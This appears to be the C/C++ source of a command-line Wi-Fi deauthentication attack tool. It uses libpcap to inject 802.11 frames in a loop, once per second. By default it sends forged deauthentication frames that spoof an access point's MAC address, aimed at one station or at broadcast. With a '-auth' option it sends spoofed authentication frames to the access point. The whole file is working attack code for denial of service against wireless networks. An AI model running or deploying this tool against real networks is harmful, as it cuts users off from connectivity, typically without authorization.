#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <cstring>
#include <unistd.h>
#include "radiotap.h"
#include "ieee80211.h"


struct auth_packet{

	radiotap_header radio_hddr;
	auth_header auth_hddr; 

};

struct deauth_packet{

	radiotap_header radio_hddr;
	deauth_header deauth_hddr; 

};

void usage() {
  printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
  printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}




int main(int argc, char* argv[]) {
	if ( (argc <3) || (argc == 5 && strncmp(argv[4],"-auth",5) ) ){
	
		usage();
		return -1;
	
	}



  char *interface = argv[1];
  char *ap_mac = argv[2];
  char *station_mac;

  if( (argc > 4) &&  !strncmp(argv[4],"-auth", 5) ){ //auth attack

  ap_mac = argv[2];
  station_mac = argv[3]; 

 
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
  if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
        return -1;
  }
  
    MacAddr station_macaddr;
    MacAddr ap_macaddr;

    station_macaddr.set_mac_addr(station_mac);
    ap_macaddr.set_mac_addr(ap_mac);


  auth_packet packet;


  packet.auth_hddr.receiver_address = ap_macaddr;
  packet.auth_hddr.transmitter_address = station_macaddr;
  packet.auth_hddr.bss_id = ap_macaddr;


  do{

    int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(struct auth_packet));
    
    if (send_res != 0) {
      fprintf(stderr, "pcap_sendpacket return %d\n", send_res);
      break;
    }
    }while (sleep(1) == 0);
    
    
    pcap_close(pcap);
    
    return 0;


  }

  else{


    if(argc>=4){ 
        station_mac = argv[3]; 
    }

    else{  //only ap_mac (AP broadcast)
        station_mac = "FF:FF:FF:FF:FF:FF";
    }


 
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
        return -1;
    }
    
    MacAddr station_macaddr;
    MacAddr ap_macaddr;

    station_macaddr.set_mac_addr(station_mac);
    ap_macaddr.set_mac_addr(ap_mac);


    
    deauth_packet packet;


  	packet.deauth_hddr.receiver_address = station_macaddr;
  	packet.deauth_hddr.transmitter_address = ap_macaddr;
  	packet.deauth_hddr.bss_id = ap_macaddr;


    do{

      int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(struct deauth_packet));

      if (send_res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d\n", send_res);
        break;
      }

    }while (sleep(1) == 0);
    pcap_close(pcap);
    
    
     return 0;
  }

  }

